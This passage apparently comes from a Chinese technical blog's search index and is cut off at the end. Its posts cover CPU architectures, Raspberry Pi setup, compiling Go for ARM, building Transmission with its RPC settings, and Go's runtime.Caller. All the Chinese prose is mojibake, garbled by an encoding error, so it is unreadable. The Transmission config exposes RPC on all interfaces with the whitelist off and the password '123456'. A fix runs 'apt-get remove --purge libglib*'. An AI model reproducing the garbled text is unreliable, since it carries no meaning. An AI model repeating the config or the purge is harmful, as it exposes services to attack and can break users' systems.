”å‘ï¼Œå®ƒé‡‡ç”¨ç²¾ç®€æŒ‡ä»¤ç³»ç»Ÿè®¡ç®—ç»“æ„(RISC)æ¥è®¾è®¡èŠ¯ç‰‡ã€‚å’ŒIntelé‡‡ç”¨çš„å¤æ‚æŒ‡ä»¤ç³»ç»Ÿè®¡ç®—ç»“æ„(CISC)ç›¸æ¯”ï¼ŒRISCå…·æœ‰è®¾è®¡æ›´ç®€å•ã€è®¾è®¡å‘¨æœŸæ›´çŸ­ç­‰ä¼˜ç‚¹ï¼Œå¹¶å¯ä»¥åº”ç”¨æ›´å¤šå…ˆè¿›çš„æŠ€æœ¯ï¼Œå¼€å‘æ›´å¿«çš„ä¸‹ä¸€ä»£å¤„ç†å™¨ã€‚\n\nMIPSæ˜¯å‡ºç°æœ€æ—©çš„å•†ä¸šRISCæ¶æ„èŠ¯ç‰‡ä¹‹ä¸€ï¼Œæ–°çš„æ¶æ„é›†æˆäº†æ‰€æœ‰åŸæ¥MIPSæŒ‡ä»¤é›†ï¼Œå¹¶å¢åŠ äº†è®¸å¤šæ›´å¼ºå¤§çš„åŠŸèƒ½ã€‚MIPSè‡ªå·±åªè¿›è¡ŒCPUçš„è®¾è®¡ï¼Œä¹‹åæŠŠè®¾è®¡æ–¹æ¡ˆæˆæƒç»™å®¢æˆ·ï¼Œä½¿å¾—å®¢æˆ·èƒ½å¤Ÿåˆ¶é€ å‡ºé«˜æ€§èƒ½çš„CPUã€‚\n\nè®©MIPSå‡ºåçš„ï¼Œå¯èƒ½æ˜¯åœ¨2007å¹´ï¼Œä¸­ç§‘é™¢è®¡ç®—æœºç ”ç©¶æ‰€çš„é¾™èŠ¯å¤„ç†å™¨è·å¾—äº†MIPSçš„å…¨éƒ¨ä¸“åˆ©ã€æŒ‡ä»¤é›†æˆæƒï¼Œä¸­å›½å¼€å§‹èµ°ä¸Šäº†ä¸€MIPSä¸ºåŸºç¡€çš„CPUç ”å‘é“è·¯ã€‚\n\n##### PowerPC\n\nPowerPCæ˜¯æœ‰è“è‰²å·¨äººIBMè”åˆè‹¹æœ(æ—©æœŸmacç”¨çš„å°±æ˜¯è¿™ä¸ª)ã€æ‘©æ‰˜ç½—æ‹‰å…¬å¸ç ”å‘çš„ä¸€ç§åŸºäºRISCç²¾ç®€æŒ‡ä»¤é›†çš„CPUï¼ŒPowerPCæ¶æ„æœ€å¤§ä¼˜ç‚¹æ˜¯çµæ´»æ€§éå¸¸å¥½ï¼Œæ ¸å¿ƒæ•°ç›®çµæ´»å¯å˜ï¼Œå› æ­¤åœ¨åµŒå…¥å¼è®¾å¤‡ä¸Šå…·æœ‰å¾ˆé«˜æ•ˆç›Šï¼Œå¯ä»¥é’ˆå¯¹æœåŠ¡å™¨å¸‚åœºåšè¶…å¤šæ ¸ï¼Œé’ˆå¯¹æŒæœºåšåŒæ ¸ï¼Œå› æ­¤å®ƒå…·æœ‰ä¼˜å¼‚çš„æ€§èƒ½ã€è¾ƒä½çš„èƒ½é‡æŸè€—ä»¥åŠè¾ƒä½çš„æ•£çƒ­é‡ã€‚\n\n##### ARMï¼ˆAdvanced RISC Machineï¼Œè¿›é˜¶ç²¾ç®€æŒ‡ä»¤é›†æœºå™¨ï¼‰\n\nARMå¯ä»¥è¯´æ˜¯ä¸€ä¸ªå¼‚å†›çªèµ·çš„CPUæ¶æ„ï¼Œé‡‡ç”¨äº†RISCç²¾ç®€æŒ‡ä»¤é›†ï¼Œè€Œä¸”ARMå‘å±•åˆ°ä»Šå¤©ï¼Œæ¶æ„ä¸Šéå¸¸çµæ´»ï¼Œå¯ä»¥æ ¹æ®é¢å‘åº”ç”¨åœºæ™¯ä¸åŒä½¿ç”¨ä¸åŒè®¾è®¡çš„å†…æ ¸ï¼Œå› æ­¤å¯ä»¥å¹¿æ³›ç”¨äºåµŒå…¥å¼ç³»ç»Ÿä¸­ï¼ŒåŒæ—¶å®ƒé«˜åº¦èŠ‚èƒ½çš„ç‰¹æ€§ï¼Œç›®å‰å„ç§ç§»åŠ¨è®¾å¤‡ä¸­å…¨éƒ½æ˜¯å®ƒçš„èº«å½±ã€‚æ®ç»Ÿè®¡ï¼Œä½¿ç”¨ARMæ¶æ„çš„èŠ¯ç‰‡å¹´å‡ºè´§é‡é«˜è¾¾200äº¿ç‰‡ï¼Œéšç€ç‰©è”ç½‘æ—¶ä»£é™ä¸´ï¼Œå¯¹äºä½åŠŸè€—æ€§ARMèŠ¯ç‰‡éœ€æ±‚é‡ä¼šå‘ç”Ÿçˆ†ç‚¸æ€§å¢é•¿ã€‚\n\n\n\n## 4. CPUæ¶æ„é—®é¢˜æ€»ç»“\n\n##### CISCã€RISCä¹‹äº‰\n\nä»ä¸Šé¢å¾—çŸ¥ï¼Œå†å²çš„é•¿æ²³é‡Œé¢ï¼Œæœ‰è¿‡è®¸è®¸å¤šå¤šçš„CPUæ¶æ„ï¼Œå®ƒä»¬ä¹‹é—´çš„å·®å¼‚æ€§éå¸¸å¤§ï¼Œç»è¿‡æ—¶é—´ã€ç”¨æˆ·çš„æ£€éªŒï¼Œæˆ‘ä»¬å¹³å¸¸æ‰€æ¥è§¦åˆ°CPUæ¶æ„ä¹Ÿå°±å‰©X86å’ŒARMä¸¤è€…ï¼ŒæŒ‰ç…§æœ€æ ¸å¿ƒçš„ä¸åŒå¯ä»¥è¢«åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œå³â€œå¤æ‚æŒ‡ä»¤é›†â€ä¸â€œç²¾ç®€æŒ‡ä»¤é›†â€ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯ç»å¸¸çœ‹åˆ°çš„â€œCISCâ€ä¸â€œRISCâ€ã€‚\n\n\n\nè¦äº†è§£X86å’ŒARM CPUæ¶æ„ï¼Œå°±å¾—å…ˆäº†è§£CISCå¤æ‚æŒ‡ä»¤é›†å’ŒRISCç²¾ç®€æŒ‡ä»¤é›† ï¼Œå› ä¸ºå®ƒä»¬ç¬¬ä¸€ä¸ªåŒºåˆ«å°±æ˜¯X86ä½¿ç”¨äº†å¤æ‚æŒ‡ä»¤é›†ï¼ˆCISCï¼‰ï¼Œè€Œåè€…ä½¿ç”¨ç²¾ç®€æŒ‡ä»¤é›†ï¼ˆRISCï¼‰ã€‚é€ æˆä»–ä»¬ä½¿ç”¨ä¸åŒè¯¥æŒ‡ä»¤é›†çš„åŸå› åœ¨äºï¼Œé¢å‘çš„è®¾å¤‡ã€å¯¹è±¡ã€æ€§èƒ½è¦æ±‚æ˜¯ä¸ä¸€æ ·ã€‚\n\næ‰‹æœºSoCæ™®ééƒ½æ˜¯é‡‡ç”¨ARMæä¾›çš„æ ¸å¿ƒä½œä¸ºåŸºç¡€ï¼Œä¾æ®è‡ªèº«éœ€æ±‚æ”¹å˜SoCçš„æ ¸å¿ƒæ¶æ„ï¼Œè€ŒARMæ­£æ­£æ˜¯RISCç²¾ç®€æŒ‡ä»¤é›†çš„ä»£è¡¨äººç‰©ã€‚CPUå·¨å¤´Intelã€AMDæ‰€é‡‡ç”¨çš„X86æ¶æ„å·²ç»æ²¿ç”¨äº†æ•°åå¹´ï¼Œæ˜¯CISCå¤æ‚æŒ‡ä»¤é›†çš„å…¸å‹ä»£è¡¨ã€‚\n\n\n\n##### ä¸ºä»€ä¹ˆx86ä¸å«x32\n\nx86ï¼Œx64ï¼Œçœ‹ä¼¼å†™æ³•ç±»ä¼¼ï¼Œä½†å®é™…ä¸Šä»£è¡¨äº†å®Œå…¨ä¸åŒçš„å«ä¹‰ã€‚ç®€å•æ¥è¯´ï¼Œx86æŒ‡çš„æ˜¯cpuçš„æ¶æ„ï¼Œx64æ˜¯cpuä½æ•°ã€‚ç¬¼ç»Ÿçš„è¯´ï¼Œå‰è€…ä»£è¡¨cpuçš„é€»è¾‘ç»“æ„ï¼Œåè€…æ˜¯cpuè¿ç®—èƒ½åŠ›ã€‚é™¤äº†x86æ¶æ„çš„cpuå¤–ï¼Œè¿˜æœ‰å¾ˆå¤šä¸åŒæ¶æ„çš„cpuï¼Œå…¶ä¸­æœ€æœ‰åçš„å°±æ˜¯IAæ¶æ„ï¼Œå³intelå®‰è…¾æ¶æ„ã€‚ä¸¤è€…ä¹‹é—´çš„ç³»ç»Ÿã€è½¯ä»¶ä¸èƒ½é€šç”¨ã€‚\n\nè€Œx64çš„å…¨ç§°å«x86-64ï¼Œä¹Ÿå°±æ˜¯è¯´x64æ˜¯x86æ¶æ„çš„64ä½cpuã€‚\n\n\n\nx86æ¶æ„ä¸­ï¼Œæœ€æ—©çš„cpuæ˜¯16ä½çš„ï¼Œå³8086ï¼Œå…¶å‰èº«è¿˜æœ‰8ä½çš„8008å’Œ4ä½çš„4004ï¼Œä½†åä¸¤è€…æ˜¯å¦å¤–çš„æ¶æ„ã€‚åå‡ºçš„80386å·²ç»å‡çº§åˆ°32ä½ã€‚\n\nè¿™æ ·å°±å¯ä»¥è§£é‡Šå¼€å§‹çš„é—®é¢˜äº†ã€‚x86æ˜¯ä¸€ç§æ¶æ„çš„å‘½åï¼Œä»£è¡¨æ‰€æœ‰çš„è¯¥æ¶æ„ä¸‹çš„cpuï¼ŒåŒ…æ‹¬16ä½ï¼Œ32ä½ï¼Œ64ä½ï¼Œå°†æ¥ä¹Ÿè®¸ä¼šæœ‰128ä½ã€‚ä¹‹æ‰€ä»¥ç”¨x86ä»£è¡¨32ä½ç³»ç»Ÿï¼Œæ˜¯ä¸€ç§é€šä¿—ç”¨æ³•ç½¢äº†ï¼Œæ˜¯ä¸ä¸¥è°¨ç”šè‡³æœ‰è¯¯çš„ã€‚ç”±äº16ä½cpuæ—©å·²æ·˜æ±°ä¸ç”¨äº†ï¼Œè€Œåœ¨64ä½å‡ºæ¥å‰ï¼Œ32ä½cpuå æ®äº†å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œæ‰€ä»¥ä¹ æƒ¯æ€§çš„ç”¨x86ä»£è¡¨32ä½cpuã€‚è€Œx64æ˜¯ä¸€ä¸ªç®€å†™ï¼Œå‘Šè¯‰å¤§å®¶çš„æ˜¯ï¼šæˆ‘æ˜¯x86æ¶æ„ä¸­çš„64ä½cpuã€‚\n\n\n\nå¦‚æœä¸¥è°¨çš„æŒ‰å‘½åè§„åˆ™æ¥çœ‹ï¼Œç°åœ¨çš„x86åº”è¯¥å«x86-32ï¼Œç®€ç§°x32ã€‚ä»¥å‰16ä½çš„8086åˆ™åº”è¯¥å«x86-16ï¼Œç®€ç§°x16ã€‚å› æ­¤ï¼Œx86ä¸å«x32ï¼Œåªæ˜¯ä¸€ç§ä¹ ç§°ï¼Œä¸€ç§è¯¯ç§°ã€‚\n\nIAæ¶æ„ä¸‹çš„cpuå‘½ååˆ™æ¯”è¾ƒä¸¥è°¨ï¼Œ32ä½å°±å«IA32ï¼Œ64å°±å«IA64ã€‚\n\n\n\n##### macä¸Šå¯ä»¥ç©iphoneçš„appå—\n\nXcodeè‡ªå¸¦çš„iOSæ¨¡æ‹Ÿå™¨å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æ¨¡æ‹Ÿå™¨,ä»–æ²¡æœ‰è¿è¡ŒarmæŒ‡ä»¤çš„èƒ½åŠ›,ä¹‹æ‰€ä»¥ä½ å¯ä»¥ç”¨å®ƒè°ƒè¯•ä½ å¼€å‘çš„app,æ˜¯å› ä¸ºè°ƒè¯•ç›®æ ‡é€‰ä¸ºæ¨¡æ‹Ÿå™¨çš„æ—¶å€™,Xcodeç”Ÿæˆçš„ä»£ç æ˜¯x86/x86_64æ¶æ„ç”¨çš„,å…·ä½“æ˜¯x86è¿˜æ˜¯x86_64å–å†³äºä½ é€‰çš„æœºå‹,å¦‚æœä½ é€‰iPhone5Sä¹‹å‰çš„æœºå‹çš„æ¨¡æ‹Ÿå™¨,é‚£å°±æ˜¯x86.\n\n\n\næ¢ä¸ªè¯´æ³•,å°±æ˜¯è¿™ä¸ªæ¨¡æ‹Ÿå™¨å¹¶æ²¡æœ‰æ¨¡æ‹Ÿarmå¤„ç†å™¨ç­‰ç¡¬ä»¶,åªæ˜¯åœ¨x86/x86_64æ¶æ„ä¸Šæä¾›äº†å’ŒiOSä¸€æ ·çš„æ¥å£çš„SDK,å…¶æ¥å£çš„è¡Œä¸ºä¹Ÿå’ŒiOSä¸Šå‡ ä¹ä¸€æ ·.ä¹‹æ‰€ä»¥è¯´å‡ ä¹ä¸€æ ·,æ˜¯å› ä¸ºçœŸçš„æœ‰ä¸ä¸€æ ·çš„åœ°æ–¹.\n\n\n\nå¥½äº†,åˆ°è¿™é‡Œä½ çŸ¥é“äº†,è¿™ä¸ªæ¨¡æ‹Ÿå™¨å…¶å®å°±æ˜¯ä¸€ä¸ªapp,æ¨¡æ‹Ÿä¸‹iOSçš„è¡Œä¸º,é‚£äº›è·‘åœ¨é‡Œé¢çš„app,å…¶å®ä¹Ÿéƒ½æ˜¯x86/x86_64çš„, è€Œapp storeä¸Šä¸Šæ¶çš„é‚£äº›app, éƒ½ä¸ä¼šåŒ…å«x86/x86_64æ¶æ„,åªæ”¯æŒarmæ¶æ„,æ‰€ä»¥æ— è®ºå¦‚ä½•ä½ ä¹Ÿæ²¡åŠæ³•åœ¨ç”µè„‘ä¸Šè¿è¡Œä»–ä»¬.\n\nè‡³äºä¸ºä»€ä¹ˆandroidå¯ä»¥,å› ä¸ºandroidæ˜¯å¼€æºçš„,ä½¿ç”¨çš„å¤„ç†å™¨æ¶æ„ä¹Ÿæ˜¯èµ„æ–™ä¸°å¯Œ,æ‰€ä»¥å¯ä»¥å¼€å‘å‡ºæ¥çœŸæ­£çš„å¯ä»¥è™šæ‹Ÿarmå¤„ç†å™¨ä»¥åŠå…¶å®ƒç¡¬ä»¶çš„æ¨¡æ‹Ÿå™¨,è¿™æ ·å°±å¯ä»¥åœ¨ç”µè„‘ä¸Šè¿è¡Œandroid appäº†.è€ŒiPhone, iTouch, iPadä½¿ç”¨çš„å¤„ç†å™¨ä¼°è®¡ç›®å‰è¿˜æ²¡æœ‰è°èƒ½çœŸæ­£æ¨¡æ‹Ÿå‡ºæ¥, å°±ç®—æœ‰è¿™ç§èƒ½äºº, ä»–ä¹Ÿæœªå¿…æœ‰åšæ¨¡æ‹Ÿå™¨çš„æƒ³æ³•,å°±ç®—æœ‰è¿™ä¸ªæƒ³æ³•,é‚£ä¹Ÿæœªå¿…æœ‰é‚£ä¸ªèƒ†é‡.\n\n\n\næœ€åè¯´ä¸ªå¸¸è¯†:\n\nåœ¨å¼€å‘iOS appæ¥å…¥ç¬¬ä¸‰æ–¹sdkçš„æ—¶å€™, å¶å°”ä¼šé‡åˆ°æ¨¡æ‹Ÿå™¨æ— æ³•æ­£ç¡®link, ä½†æ˜¯çœŸæœºå¯ä»¥çš„æƒ…å†µ.è¿™å…¶å®å°±æ˜¯å› ä¸ºsdkæä¾›å•†æä¾›çš„sdk,æ ¹æœ¬å°±æ²¡æ”¯æŒx86/x86_64,é„™è§†\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["cpu"],"categories":["ç³»ç»Ÿ"]},{"title":"åœ¨æ ‘è“æ´¾armä¸Šè¿è¡Œgolangå’Œcç¨‹åº","url":"%2Fp%2F21dd607c.html","content":"\n\n## æ ‘è“æ´¾åŸºç¡€è®¾ç½®\n\n##### æ ‘è“æ´¾ä¿®æ”¹é”®ç›˜å¸ƒå±€\n\n```\nsudo dpkg-reconfigure keyboard-configuration\n```\n\né€‰é€šç”¨çš„101é”®PCé”®ç›˜\n\nåœ¨é”®ç›˜layouté€‰æ‹©ä¸­ï¼Œé€‰Other\n\nç„¶ååœ¨é€‰é¡¹ä¸­ï¼Œé€‰English(US)\n\nå†é€‰English(US, alternative international)\n\nä¸€ç›´ä¸‹ä¸€æ­¥,æœ€åé‡å¯\n\n```\nsudo reboot\n```\n\n\n\n##### æ ‘è“æ´¾ä¿®æ”¹å¯åŠ¨è¿›å…¥ç»ˆç«¯ç•Œé¢\n\n```\n\nsudo raspi-config\n\nboot option ->console\n\n```\n<!-- more -->\n\n\n##### æ ‘è“æ´¾å¼€å¯ssh\n\n```\n\nsudo raspi-config\n\nSelect Interfacing Options\n\nNavigate to and select SSH\n\nChoose Yes\n\nSelect Ok\n\nChoose Finish\n\n\nsudo systemctl enable ssh\n\nsudo systemctl start ssh\n```\n\n\n\n## ç¼–è¯‘golangä¸ºarmå¯æ‰§è¡Œç¨‹åº\n\n\n\n```\nGOOS=linux GOARCH=arm GOARM=6 go build -v\n```\n\n\n\nGOARM=5: use software floating point; when CPU doesn't have VFP co-processor\n\nGOARM=6: use VFPv1 only; default if cross compiling; usually ARM11 or better cores (VFPv2 or better is also supported)\n\nGOARM=7: use VFPv3; usually Cortex-A cores\n\n\n\n## ç¼–è¯‘armå¯æ‰§è¡Œç¨‹åº\n\nç¼ºå°‘çš„ç¨‹åºç›´æ¥ä½¿ç”¨`åŒ…ç®¡ç†`ä¸‹è½½å³å¯\n\n##### è§£å†³ä¸‹è½½è½¯ä»¶åŒ…è¿æ¥ä¸ä¸Šçš„é—®é¢˜ connect to mirrors.opencas.cn....\n\n   ```\nsudo vim /etc/apt/sources.list \n   \næ›¿æ¢æºä¸º\n   \ndeb http://mirrors.shu.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi\n   \nsudo apt-get update&& sudo apt-get -y dist-upgrade&&sudo apt-get update \n   ```\n","tags":["æ ‘è“æ´¾"],"categories":["ç³»ç»Ÿ"]},{"title":"transmissionç¼–è¯‘å®‰è£…å’Œgolang_rpcçš„è°ƒç”¨","url":"%2Fp%2Fbf531b37.html","content":"\n### 1. macç¼–è¯‘transmission\n\n+ ä¸‹è½½é¡¹ç›®\n\n```bash\ngit clone https://github.com/transmission/transmission Transmission\ncd Transmission\ngit submodule update --init\nXcode project file (Transmission.xcodeproj) for building in Xcode. \n```\n\n\n\n+ åœ¨ xcodeä¸­ç¼–è¯‘\n\n  ä¸‹å›¾ç¬¬ä¸€ä¸ªæ˜¯ç¼–è¯‘ mac çš„åº”ç”¨ç¨‹åº,  ç¬¬äºŒä¸ªæ˜¯å¯ä»¥ç¼–è¯‘ transmission-daemon ç¨‹åº\n\n![1](transmission/1.png)\n\n<!-- more -->\n\n\n\n### 2. ubuntu 16.04ç¼–è¯‘transmission\n\n```bash\n$ sudo apt-get install cmake make build-essential automake autoconf libtool pkg-config intltool libcurl4-openssl-dev libglib2.0-dev libevent-dev libminiupnpc-dev libgtk-3-dev libappindicator3-dev gettext libssl-dev\n\n$ git clone https://github.com/transmission/transmission Transmission\n$ cd Transmission\n$ git submodule update --init\n$ mkdir build\n$ cd build\n$ cmake ..\n$ make\n$ sudo make install (make install DESTDIR=a)\n```\n\nå®‰è£…å®Œæˆåå‡ºç°ä»¥ä¸‹å‘½ä»¤:\n\n![2](transmission/2.png)\n\n\n\nç¼–è¯‘æ—¶é‡åˆ°çš„é—®é¢˜:\n\n1. CMAKE_MAKE_PROGRAM is not set\n\n```\nsudo apt-get install gettext\nsudo apt-get install make \nsudo apt-get install libssl-dev\n```\n\n2. missing: CURL_LIBRARY CURL_INCLUDE_DIR\n\n```\nsudo apt-get install libcurl4-openssl-dev//ubuntu\nyum install curl-devel//centos\n```\n\n3. autogen.sh: not found\n\n```\nsudo apt-get install autoconf\nsudo apt-get install automake\nsudo apt-get install libtool\n```\n\n4. transmission libevent å˜æˆäº†event\n\n   æŠŠæ‰€æœ‰çš„ä¾èµ–å…¨éƒ¨è£…ä¸€é, å®‰è£…ååˆ é™¤build. é‡æ–°cmakeä¸€ä¸‹\n\n5. undefined reference to `g_log_structured_standard`\n\n   ```bash\n   apt-get remove --purge libglib*\n   apt-get install libglib-2.x-y  # where x and y are whatever the package version says.\n   ```\n\n   \n\n\n\n### 3. transmission ä»‹ç»\n\n- transmission-cliï¼š ç‹¬ç«‹çš„å‘½ä»¤è¡Œå®¢æˆ·ç«¯ã€‚\n- transmission-createï¼š ç”¨æ¥å»ºç«‹.torrentç§å­æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·ã€‚\n- transmission-daemonï¼š åå°å®ˆæŠ¤ç¨‹åºã€‚\n- transmission-editï¼š ç”¨æ¥ä¿®æ”¹.torrentç§å­æ–‡ä»¶çš„announce URLã€‚\n- transmission-remoteï¼š æ§åˆ¶daemonçš„ç¨‹åºã€‚\n- transmission-showï¼šæŸ¥çœ‹.torrentæ–‡ä»¶çš„ä¿¡æ¯ã€‚\n\n\n\n1. é…ç½®æ–‡ä»¶ç›®å½•é‡Œé¢åŒ…å«å¦‚ä¸‹ä¸€äº›æ–‡ä»¶ï¼š\n\n- settings.jsonï¼š ä¸»è¦çš„é…ç½®æ–‡ä»¶ï¼Œè®¾ç½®daemonçš„å„é¡¹å‚æ•°ï¼ŒåŒ…æ‹¬RPCçš„ç”¨æˆ·åå¯†ç é…ç½®ã€‚å®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘çš„åŸå§‹æ–‡ä»¶æ˜¯/etc/transmission-daemon/settings.jsonã€‚é‡Œé¢çš„å‚æ•°è§£é‡Šå¯ä»¥å‚è€ƒå®˜ç½‘çš„é…ç½®è¯´æ˜ã€‚\n- torrents/ï¼š ç”¨æˆ·å­˜æ”¾.torrentç§å­æ–‡ä»¶çš„ç›®å½•,å‡¡æ˜¯æ·»åŠ åˆ°ä¸‹è½½ä»»åŠ¡çš„ç§å­ï¼Œéƒ½å­˜æ”¾åœ¨è¿™é‡Œã€‚.torrentçš„å‘½ååŒ…å«,ç§å­æ–‡ä»¶æœ¬èº«çš„åå­—å’Œç§å­çš„SHA1 HASHå€¼ã€‚\n- resume/ï¼š è¯¥å­˜æ”¾äº†.resumeæ–‡ä»¶ï¼Œ.resumeæ–‡ä»¶åŒ…å«äº†ä¸€ä¸ªç§å­çš„ä¿¡æ¯ï¼Œä¾‹å¦‚è¯¥æ–‡ä»¶å“ªäº›éƒ¨åˆ†è¢«ä¸‹è½½äº†ï¼Œä¸‹è½½çš„æ•°æ®å­˜å‚¨çš„ä½ç½®ç­‰ç­‰ã€‚\n- blocklists/ï¼š å­˜å‚¨è¢«å±è”½çš„peerçš„åœ°å€ã€‚\n- dht.datï¼š å­˜å‚¨DHTèŠ‚ç‚¹ä¿¡æ¯ã€‚\n\n\n\né…ç½®ä¸»è¦æ˜¯é€šè¿‡ä¿®æ”¹Â `/var/lib/transmission-daemon/info/settings.json`Â æ–‡ä»¶ä¸­çš„å‚æ•°æ¥å®ç°çš„ã€‚ **æ³¨æ„**ï¼šåœ¨ç¼–è¾‘ transmission é…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œéœ€è¦å…ˆå…³é—­ daemon è¿›ç¨‹ï¼Œå¦åˆ™ç¼–è¾‘çš„å‚æ•°å°†ä¼šè¢«æ¢å¤åˆ°åŸæ¥çš„çŠ¶æ€ã€‚\n\n\n\n2. RPCå‚æ•°ä»‹ç»: \n\n```\n{\n\"download-dir\": \"/down\", #ä¸‹è½½ç›®å½•çš„ç»å¯¹è·¯å¾„\n\"incomplete-dir\": \"/down/temp\", #ä¸´æ—¶æ–‡ä»¶è·¯å¾„\n\"rpc-authentication-required\": true, #å¯ç”¨éªŒè¯\n\"rpc-bind-address\": \"0.0.0.0\", #å…è®¸ä»»ä½•IPé€šè¿‡RPCåè®®è®¿é—®\n\"rpc-enabled\": true, #å…è®¸é€šè¿‡RPCè®¿é—®\n\"rpc-password\": \"123456\", #RPCéªŒè¯å¯†ç ï¼ˆä¿å­˜å¹¶å¯åŠ¨ådaemonä¼šè®¡ç®—å¹¶æ›¿æ¢ä¸ºHASHå€¼ä»¥å¢åŠ å®‰å…¨æ€§ï¼‰\n\"rpc-port\": 9091, #RPCç«¯å£\n\"rpc-username\": \"transmission\", #RPCéªŒè¯ç”¨æˆ·å\n\"rpc-whitelist\": \"*\", #RPCè®¿é—®ç™½åå•\n\"rpc-whitelist-enabled\": false, #å…³é—­ç™½åå•åŠŸèƒ½ä»¥ä¾¿å…¬ç½‘è®¿é—®\n}\n```\n\næ›´å¤šå‚æ•°è¯´æ˜è¯·è§[å®˜æ–¹Wiki](https://github.com/transmission/transmission/wiki/Editing-Configuration-Files)\n\n\n\n### 4. macä½¿ç”¨webç•Œé¢æ§åˆ¶transmission daemon\n\n\n\n+ è¿è¡ŒXcode ç¼–è¯‘å¥½çš„å®¢æˆ·ç«¯, è®¾ç½® Remote\n\n\n\n![2](transmission/3.png)\n\n\n\n\n\nåœ¨æµè§ˆå™¨ä¸­è®¿é—®`http://localhost:9091/transmission/web`Â å¹¶è¾“å…¥è®¾ç½®çš„ç”¨æˆ·ååŠå¯†ç å°±å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•Œé¢\n\n![2](transmission/4.png)\n\n+ è¿è¡ŒXcodeç¼–è¯‘å¥½çš„transmission-daemon\n\n \n\né…ç½®æ–‡ä»¶åœ¨ `/Users/liuwei/Library/Application\\ Support/transmission-daemon/settings.json` \n\nè®¾ç½®ç¯å¢ƒå˜é‡å `export TRANSMISSION_WEB_HOME=/Users/liuwei/workspace/transmission/web`\n\né€šè¿‡æµè§ˆå™¨è®¿é—®`http://localhost:9091/transmission/web`\n\n\n\n+ è®¿é—®å¤–ç½‘ipé”™è¯¯\n\nunauthorized ip address403: ForbiddenUnauthorized IP Address.Either disable the IP address whitelist or add your address to it.If you're editing settings.json, see the 'rpc-whitelist' and 'rpc-whitelist-enabled' entries.If you're still using ACLs, use a whitelist instead. See the transmission-daemon manpage for details.\n\n\n\n```\ntransmission/.config/transmission-daemon/settings.json  \n\n\"rpc-whitelist-enabled\": true,  tureæ”¹æˆfalseã€‚\n```\n\n\n\n### 5. golangé€šè¿‡rpcè°ƒç”¨transmission\n\n\n\n+ rpc api\n\nhttps://github.com/transmission/transmission/blob/master/extras/rpc-spec.txt\n\n+ golang lib for Transmission API\n\nhttps://github.com/pyed/transmission","tags":["transmission"],"categories":["bittorrent"]},{"title":"golang_runtimeå‡½æ•°è°ƒç”¨ä¿¡æ¯","url":"%2Fp%2F375281af.html","content":"\n\nå‡½æ•°çš„è°ƒç”¨ä¿¡æ¯æ˜¯ç¨‹åºä¸­æ¯”è¾ƒé‡è¦è¿è¡ŒæœŸä¿¡æ¯, åœ¨å¾ˆå¤šåœºåˆéƒ½ä¼šç”¨åˆ°(æ¯”å¦‚è°ƒè¯•æˆ–æ—¥å¿—)ã€‚\n\nGo è¯­è¨€ `runtime` åŒ…çš„ `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` ç­‰å‡ ä¸ªå‡½æ•°æä¾›äº†è·å–å‡½æ•°è°ƒç”¨è€…ä¿¡æ¯çš„æ–¹æ³•.\n\n \n\nè¿™å‡ ä¸ªå‡½æ•°çš„æ–‡æ¡£é“¾æ¥:\n\n- <http://golang.org/pkg/runtime/#Caller>\n\n- <http://golang.org/pkg/runtime/#Callers>\n\n- <http://golang.org/pkg/runtime/#FuncForPC>\n\n  \n\n## runtime.Callerçš„ç”¨æ³•(å¸¸ç”¨)\n\nå‡½æ•°çš„ç­¾åå¦‚ä¸‹:\n\n```\nfunc runtime.Caller(skip int) (pc uintptr, file string, line int, ok bool)\n```\n\n`runtime.Caller` è¿”å›å½“å‰ `goroutine` çš„æ ˆä¸Šçš„å‡½æ•°è°ƒç”¨ä¿¡æ¯. ä¸»è¦æœ‰å½“å‰çš„`pc` å€¼å’Œè°ƒç”¨çš„æ–‡ä»¶å’Œè¡Œå·ç­‰ä¿¡æ¯. è‹¥æ— æ³•è·å¾—ä¿¡æ¯, è¿”å›çš„ `ok` å€¼ä¸º `false`.\n\n <!-- more -->\n\nå…¶è¾“å…¥å‚æ•° `skip` ä¸ºè¦è·³è¿‡çš„æ ˆå¸§æ•°, è‹¥ä¸º `0` åˆ™è¡¨ç¤º `runtime.Caller` çš„è°ƒç”¨è€….\n\n*æ³¨æ„:ç”±äºå†å²åŸå› , runtime.Caller å’Œ runtime.Callers ä¸­çš„ skip å«ä¹‰å¹¶ä¸ç›¸åŒ, åé¢ä¼šè®²åˆ°.*\n\n\n\nä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­, æ‰“å°å‡½æ•°è°ƒç”¨çš„æ ˆå¸§ä¿¡æ¯:\n\n```\nfunc main() {\n\tfor skip := 0; skip < 3; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198453, file = caller.go, line = 10\n\t// skip = 1, pc = 4280066, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4289712, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n}\n```\n\n\n\n## runtime.Callersçš„ç”¨æ³•\n\nå‡½æ•°çš„ç­¾åå¦‚ä¸‹:\n\n```\nfunc runtime.Callers(skip int, pc []uintptr) int\n```\n\n`runtime.Callers`Â å‡½æ•°å’ŒÂ `runtime.Caller`Â å‡½æ•°è™½ç„¶åå­—ç›¸ä¼¼(å¤šä¸€ä¸ªåç¼€`s`), ä½†æ˜¯å‡½æ•°çš„å‚æ•°/è¿”å›å€¼å’Œå‚æ•°çš„æ„ä¹‰éƒ½æœ‰å¾ˆå¤§çš„å·®å¼‚.\n\n\n\n`runtime.Callers`Â æŠŠè°ƒç”¨å®ƒçš„å‡½æ•°Goç¨‹æ ˆä¸Šçš„ç¨‹åºè®¡æ•°å™¨å¡«å…¥åˆ‡ç‰‡Â `pc`Â ä¸­. å‚æ•°Â `skip`Â 